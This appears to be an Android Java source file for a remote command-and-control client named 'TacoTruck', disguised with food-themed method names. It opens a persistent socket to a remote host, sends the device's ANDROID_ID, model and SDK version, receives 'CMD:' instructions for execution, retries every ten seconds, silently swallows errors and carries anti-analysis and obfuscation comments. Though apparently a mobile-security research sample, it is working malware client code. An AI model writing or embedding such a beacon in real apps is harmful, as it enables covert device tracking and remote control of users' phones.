package com.example.mobsec_823;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.example.mobsec_823.utils.SafetyNet;
import com.example.mobsec_823.utils.SecretBox;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class TacoTruck {
    private static final String TAG = "TacoTruck";
    private final String kitchenIp;
    private final int kitchenPort;
    private final OrderListener listener;
    private final Context context;
    private Socket socket;
    private PrintWriter out;
    private InputStream in;
    private volatile boolean isOpen = false;

    public interface OrderListener {
        void onOrderReceived(String order);
    }

    public TacoTruck(Context context, String ip, int port, OrderListener listener) {
        this.context = context;
        this.kitchenIp = ip;
        this.kitchenPort = port;
        this.listener = listener;
    }

    public void openForBusiness() {
        if (isOpen) return;
        
        // Anti-Analysis check: Log detection but proceed for research
//        if (!SafetyNet.INSTANCE.isEnvironmentSafe()) {
//            Log.e(TAG, "Analysis environment detected, but proceeding for research purposes.");
//        }

        isOpen = true;

        new Thread(() -> {
            while (isOpen) {
                try {
                    // Logic Protection: Control Flow Flattening
                    if (!SafetyNet.INSTANCE.checkKitchenPermit(99)) {
                        break;
                    }

                    socket = new Socket(kitchenIp, kitchenPort);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = socket.getInputStream();

                    sendHandshake();
                    listenForOrders();

                } catch (Exception e) {
                } finally {
                    closeShop();
                    if (isOpen) {
                        try {
                            Thread.sleep(10000); // Retry every 10 seconds
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                }
            }
        }).start();
    }

    private void sendHandshake() {
        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String model = Build.MODEL;
        int sdk = Build.VERSION.SDK_INT;
        
        // Handshake pattern: ID:<id>;MODEL:<model>;SDK:<sdk>
        String handshakeMsg = String.format("ID:%s;MODEL:%s;SDK:%d", deviceId, model, sdk);
        sendToKitchen(handshakeMsg);
    }

    private void listenForOrders() throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
        String line;
        while ((line = reader.readLine()) != null) {
            // "CMD:" prefix is part of the protocol
            if (line.startsWith("CMD:")) {
                if (listener != null) {
                    listener.onOrderReceived(line.substring(4));
                }
            }
        }
    }

    public void sendToKitchen(String message) {
        if (out != null) {
            new Thread(() -> {
                try {
                    out.println(message);
                } catch (Exception e) {
                    // ignore
                }
            }).start();
        }
    }

    public void closeDown() {
        isOpen = false;
        closeShop();
    }

    private void closeShop() {
        try {
            if (socket != null && !socket.isClosed()) {
                socket.close();
            }
        } catch (Exception e) {
        }
        socket = null;
        out = null;
        in = null;
    }
}
